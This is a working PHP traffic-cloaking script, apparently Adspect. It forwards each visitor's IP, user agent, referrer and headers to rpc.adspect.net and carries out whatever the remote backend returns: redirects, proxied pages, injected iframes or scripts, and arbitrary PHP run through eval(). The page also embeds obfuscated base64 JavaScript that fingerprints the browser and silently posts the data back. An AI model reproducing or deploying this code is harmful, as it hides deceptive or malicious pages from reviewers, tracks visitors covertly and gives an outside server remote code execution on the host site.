<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; $query = parse_url($url, PHP_URL_QUERY); if (is_string($query)) { parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'html': case 'htm': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } if (!empty($headers)) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'curl extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('78d9b225-e885-4a07-800e-643a559c537d', 'redirect', '_', base64_decode('VJ1VKixrHDosHOsNNoZzVlN9eq5UXTD3kBHdpHDszKQ=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
	<meta name="referrer" content="no-referrer">
</head>
<body>
	<script src="data:text/javascript;base64,dmFyIF8weDVlMjI9WydpbnB1dCcsJ3N0YXRlJywndGltZXpvbmVPZmZzZXQnLCcyNTE0N2RtRExYYicsJ2RvY3VtZW50JywnYXBwZW5kQ2hpbGQnLCcyM3pFZXBhTCcsJzM5NzY3OXZtb2hsRycsJ2dldENvbnRleHQnLCdtZXNzYWdlJywnZm9ybScsJ25hdmlnYXRvcicsJ3RvU3RyaW5nJywnbm9kZVZhbHVlJywnc2NyZWVuJywnaGlkZGVuJywnd2ViZ2wnLCdOb3RpZmljYXRpb24nLCdjbG9zdXJlJywnc3VibWl0JywnYm9keScsJ2dldE93blByb3BlcnR5TmFtZXMnLCd2YWx1ZScsJzFlVXVOSVgnLCdnZXRQYXJhbWV0ZXInLCc2M2lFRWlyQycsJ3RoZW4nLCdub3RpZmljYXRpb25zJywnbmFtZScsJ3Blcm1pc3Npb25zJywnNTkzMTIxSXd0ZWRVJywnYXR0cmlidXRlcycsJzU5MjFkZG5vc0knLCdjb25zb2xlJywnZG9jdW1lbnRFbGVtZW50JywnNjg5OTQybkljb1FoJywnVU5NQVNLRURfUkVOREVSRVJfV0VCR0wnLCdub2RlTmFtZScsJ2NyZWF0ZUVsZW1lbnQnLCdtZXRob2QnLCcxMEhLa2VMVCcsJ29iamVjdCcsJzEzOTc1bFB0VVNnJywnbGVuZ3RoJywnVU5NQVNLRURfVkVORE9SX1dFQkdMJywndG9zdHJpbmcnLCdsb2cnLCdwdXNoJywnZGF0YScsJ2FjdGlvbicsJ3F1ZXJ5JywnMTI0MzgxMFJHcUlBWScsJ2hyZWYnLCd3aW5kb3cnLCdsb2NhdGlvbicsJ3Blcm1pc3Npb24nLCdUb3VjaEV2ZW50JywnV0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbycsJ2dldFRpbWV6b25lT2Zmc2V0JywnY2FudmFzJ107dmFyIF8weGIzNzI9ZnVuY3Rpb24oXzB4MmE4NDYzLF8weDExY2FmNSl7XzB4MmE4NDYzPV8weDJhODQ2My0weDE3MTt2YXIgXzB4NWUyMmIwPV8weDVlMjJbXzB4MmE4NDYzXTtyZXR1cm4gXzB4NWUyMmIwO307KGZ1bmN0aW9uKF8weDIwMDM0NixfMHg0Y2M0YWMpe3ZhciBfMHg0NTljYTA9XzB4YjM3Mjt3aGlsZSghIVtdKXt0cnl7dmFyIF8weDJmMDQzMz1wYXJzZUludChfMHg0NTljYTAoMHgxNzMpKSstcGFyc2VJbnQoXzB4NDU5Y2EwKDB4MWE2KSkqcGFyc2VJbnQoXzB4NDU5Y2EwKDB4MWE0KSkrcGFyc2VJbnQoXzB4NDU5Y2EwKDB4MTljKSkqLXBhcnNlSW50KF8weDQ1OWNhMCgweDE5NSkpK3BhcnNlSW50KF8weDQ1OWNhMCgweDE5MykpKnBhcnNlSW50KF8weDQ1OWNhMCgweDE5ZikpKy1wYXJzZUludChfMHg0NTljYTAoMHgxOWEpKStwYXJzZUludChfMHg0NTljYTAoMHgxN2YpKSotcGFyc2VJbnQoXzB4NDU5Y2EwKDB4MTgyKSkrcGFyc2VJbnQoXzB4NDU5Y2EwKDB4MTgzKSk7aWYoXzB4MmYwNDMzPT09XzB4NGNjNGFjKWJyZWFrO2Vsc2UgXzB4MjAwMzQ2WydwdXNoJ10oXzB4MjAwMzQ2WydzaGlmdCddKCkpO31jYXRjaChfMHg0OTU0NDQpe18weDIwMDM0NlsncHVzaCddKF8weDIwMDM0Nlsnc2hpZnQnXSgpKTt9fX0oXzB4NWUyMiwweDlkZmY0KSxmdW5jdGlvbigpe3ZhciBfMHgzODJkOGQ9XzB4YjM3MjtmdW5jdGlvbiBfMHgzZWU5MzUoKXt2YXIgXzB4MmI5OTdjPV8weGIzNzI7XzB4NTk1YTZjWydlcnJvcnMnXT1fMHg1MGMyYWI7dmFyIF8weDFkMDU3MD1kb2N1bWVudFsnY3JlYXRlRWxlbWVudCddKF8weDJiOTk3YygweDE4NikpLF8weGM0Y2Q3ND1kb2N1bWVudFtfMHgyYjk5N2MoMHgxYTIpXShfMHgyYjk5N2MoMHgxN2MpKTtfMHgxZDA1NzBbXzB4MmI5OTdjKDB4MWEzKV09J1BPU1QnLF8weDFkMDU3MFtfMHgyYjk5N2MoMHgxNzEpXT13aW5kb3dbJ2xvY2F0aW9uJ11bXzB4MmI5OTdjKDB4MTc0KV0sXzB4YzRjZDc0Wyd0eXBlJ109XzB4MmI5OTdjKDB4MThiKSxfMHhjNGNkNzRbXzB4MmI5OTdjKDB4MTk4KV09XzB4MmI5OTdjKDB4MWFjKSxfMHhjNGNkNzRbXzB4MmI5OTdjKDB4MTkyKV09SlNPTlsnc3RyaW5naWZ5J10oXzB4NTk1YTZjKSxfMHgxZDA1NzBbXzB4MmI5OTdjKDB4MTgxKV0oXzB4YzRjZDc0KSxkb2N1bWVudFtfMHgyYjk5N2MoMHgxOTApXVsnYXBwZW5kQ2hpbGQnXShfMHgxZDA1NzApLF8weDFkMDU3MFtfMHgyYjk5N2MoMHgxOGYpXSgpO312YXIgXzB4NTBjMmFiPVtdLF8weDU5NWE2Yz17fTt0cnl7dmFyIF8weDJlZjJiZD1mdW5jdGlvbihfMHgzZTAxOWQpe3ZhciBfMHg4OWNhNWI9XzB4YjM3MjtpZihfMHg4OWNhNWIoMHgxYTUpPT09dHlwZW9mIF8weDNlMDE5ZCYmbnVsbCE9PV8weDNlMDE5ZCl7dmFyIF8weDE3NWU3YT1mdW5jdGlvbihfMHgyMmZjN2Ipe3ZhciBfMHgyN2EwNjE9XzB4ODljYTViO3RyeXt2YXIgXzB4NGM3OGJkPV8weDNlMDE5ZFtfMHgyMmZjN2JdO3N3aXRjaCh0eXBlb2YgXzB4NGM3OGJkKXtjYXNlIF8weDI3YTA2MSgweDFhNSk6aWYobnVsbD09PV8weDRjNzhiZClicmVhaztjYXNlJ2Z1bmN0aW9uJzpfMHg0Yzc4YmQ9XzB4NGM3OGJkW18weDI3YTA2MSgweDE4OCldKCk7fV8weDJkN2M3MFtfMHgyMmZjN2JdPV8weDRjNzhiZDt9Y2F0Y2goXzB4M2VjMGI1KXtfMHg1MGMyYWJbJ3B1c2gnXShfMHgzZWMwYjVbXzB4MjdhMDYxKDB4MTg1KV0pO319LF8weDJkN2M3MD17fSxfMHhiZTU3ODtmb3IoXzB4YmU1NzggaW4gXzB4M2UwMTlkKV8weDE3NWU3YShfMHhiZTU3OCk7dHJ5e3ZhciBfMHg1NzRiYzA9T2JqZWN0W18weDg5Y2E1YigweDE5MSldKF8weDNlMDE5ZCk7Zm9yKF8weGJlNTc4PTB4MDtfMHhiZTU3ODxfMHg1NzRiYzBbXzB4ODljYTViKDB4MWE3KV07KytfMHhiZTU3OClfMHgxNzVlN2EoXzB4NTc0YmMwW18weGJlNTc4XSk7XzB4MmQ3YzcwWychISddPV8weDU3NGJjMDt9Y2F0Y2goXzB4MjNlODc1KXtfMHg1MGMyYWJbXzB4ODljYTViKDB4MWFiKV0oXzB4MjNlODc1W18weDg5Y2E1YigweDE4NSldKTt9cmV0dXJuIF8weDJkN2M3MDt9fTtfMHg1OTVhNmNbJ3NjcmVlbiddPV8weDJlZjJiZCh3aW5kb3dbXzB4MzgyZDhkKDB4MThhKV0pLF8weDU5NWE2Y1tfMHgzODJkOGQoMHgxNzUpXT1fMHgyZWYyYmQod2luZG93KSxfMHg1OTVhNmNbXzB4MzgyZDhkKDB4MTg3KV09XzB4MmVmMmJkKHdpbmRvd1tfMHgzODJkOGQoMHgxODcpXSksXzB4NTk1YTZjW18weDM4MmQ4ZCgweDE3NildPV8weDJlZjJiZCh3aW5kb3dbXzB4MzgyZDhkKDB4MTc2KV0pLF8weDU5NWE2Y1tfMHgzODJkOGQoMHgxOWQpXT1fMHgyZWYyYmQod2luZG93Wydjb25zb2xlJ10pLF8weDU5NWE2Y1tfMHgzODJkOGQoMHgxOWUpXT1mdW5jdGlvbihfMHgxMWU0ZmIpe3ZhciBfMHg0Mzc3NjM9XzB4MzgyZDhkO3RyeXt2YXIgXzB4MjMyODU2PXt9O18weDExZTRmYj1fMHgxMWU0ZmJbXzB4NDM3NzYzKDB4MTliKV07Zm9yKHZhciBfMHg0ZDkzMTUgaW4gXzB4MTFlNGZiKV8weDRkOTMxNT1fMHgxMWU0ZmJbXzB4NGQ5MzE1XSxfMHgyMzI4NTZbXzB4NGQ5MzE1W18weDQzNzc2MygweDFhMSldXT1fMHg0ZDkzMTVbXzB4NDM3NzYzKDB4MTg5KV07cmV0dXJuIF8weDIzMjg1Njt9Y2F0Y2goXzB4M2QyYTk0KXtfMHg1MGMyYWJbXzB4NDM3NzYzKDB4MWFiKV0oXzB4M2QyYTk0W18weDQzNzc2MygweDE4NSldKTt9fShkb2N1bWVudFtfMHgzODJkOGQoMHgxOWUpXSksXzB4NTk1YTZjW18weDM4MmQ4ZCgweDE4MCldPV8weDJlZjJiZChkb2N1bWVudCk7dHJ5e18weDU5NWE2Y1tfMHgzODJkOGQoMHgxN2UpXT1uZXcgRGF0ZSgpW18weDM4MmQ4ZCgweDE3YSldKCk7fWNhdGNoKF8weDRlMTY5Yyl7XzB4NTBjMmFiW18weDM4MmQ4ZCgweDFhYildKF8weDRlMTY5Y1tfMHgzODJkOGQoMHgxODUpXSk7fXRyeXtfMHg1OTVhNmNbXzB4MzgyZDhkKDB4MThlKV09ZnVuY3Rpb24oKXt9W18weDM4MmQ4ZCgweDE4OCldKCk7fWNhdGNoKF8weDNmNTNjMyl7XzB4NTBjMmFiWydwdXNoJ10oXzB4M2Y1M2MzW18weDM4MmQ4ZCgweDE4NSldKTt9dHJ5e18weDU5NWE2Y1sndG91Y2hFdmVudCddPWRvY3VtZW50WydjcmVhdGVFdmVudCddKF8weDM4MmQ4ZCgweDE3OCkpW18weDM4MmQ4ZCgweDE4OCldKCk7fWNhdGNoKF8weDM5ZTU1MSl7XzB4NTBjMmFiW18weDM4MmQ4ZCgweDFhYildKF8weDM5ZTU1MVtfMHgzODJkOGQoMHgxODUpXSk7fXRyeXtfMHgyZWYyYmQ9ZnVuY3Rpb24oKXt9O3ZhciBfMHgyZDZkYjc9MHgwO18weDJlZjJiZFsndG9TdHJpbmcnXT1mdW5jdGlvbigpe3JldHVybisrXzB4MmQ2ZGI3LCcnO30sY29uc29sZVtfMHgzODJkOGQoMHgxYWEpXShfMHgyZWYyYmQpLF8weDU5NWE2Y1tfMHgzODJkOGQoMHgxYTkpXT1fMHgyZDZkYjc7fWNhdGNoKF8weDZhZTdiMSl7XzB4NTBjMmFiWydwdXNoJ10oXzB4NmFlN2IxW18weDM4MmQ4ZCgweDE4NSldKTt9d2luZG93W18weDM4MmQ4ZCgweDE4NyldW18weDM4MmQ4ZCgweDE5OSldW18weDM4MmQ4ZCgweDE3MildKHsnbmFtZSc6XzB4MzgyZDhkKDB4MTk3KX0pW18weDM4MmQ4ZCgweDE5NildKGZ1bmN0aW9uKF8weDQyMDNjMil7dmFyIF8weDVlOWZlZD1fMHgzODJkOGQ7XzB4NTk1YTZjW18weDVlOWZlZCgweDE5OSldPVt3aW5kb3dbXzB4NWU5ZmVkKDB4MThkKV1bXzB4NWU5ZmVkKDB4MTc3KV0sXzB4NDIwM2MyW18weDVlOWZlZCgweDE3ZCldXSxfMHgzZWU5MzUoKTt9LF8weDNlZTkzNSk7dHJ5e3ZhciBfMHg0NmQ0Njc9ZG9jdW1lbnRbJ2NyZWF0ZUVsZW1lbnQnXShfMHgzODJkOGQoMHgxN2IpKVtfMHgzODJkOGQoMHgxODQpXSgnd2ViZ2wnKSxfMHgxZmUyNGE9XzB4NDZkNDY3WydnZXRFeHRlbnNpb24nXShfMHgzODJkOGQoMHgxNzkpKTtfMHg1OTVhNmNbXzB4MzgyZDhkKDB4MThjKV09eyd2ZW5kb3InOl8weDQ2ZDQ2N1tfMHgzODJkOGQoMHgxOTQpXShfMHgxZmUyNGFbXzB4MzgyZDhkKDB4MWE4KV0pLCdyZW5kZXJlcic6XzB4NDZkNDY3W18weDM4MmQ4ZCgweDE5NCldKF8weDFmZTI0YVtfMHgzODJkOGQoMHgxYTApXSl9O31jYXRjaChfMHg4NTRlMDgpe18weDUwYzJhYltfMHgzODJkOGQoMHgxYWIpXShfMHg4NTRlMDhbXzB4MzgyZDhkKDB4MTg1KV0pO319Y2F0Y2goXzB4M2UxNjA2KXtfMHg1MGMyYWJbXzB4MzgyZDhkKDB4MWFiKV0oXzB4M2UxNjA2W18weDM4MmQ4ZCgweDE4NSldKSxfMHgzZWU5MzUoKTt9fSgpKTs="></script>
</body>
</html>
<?php exit;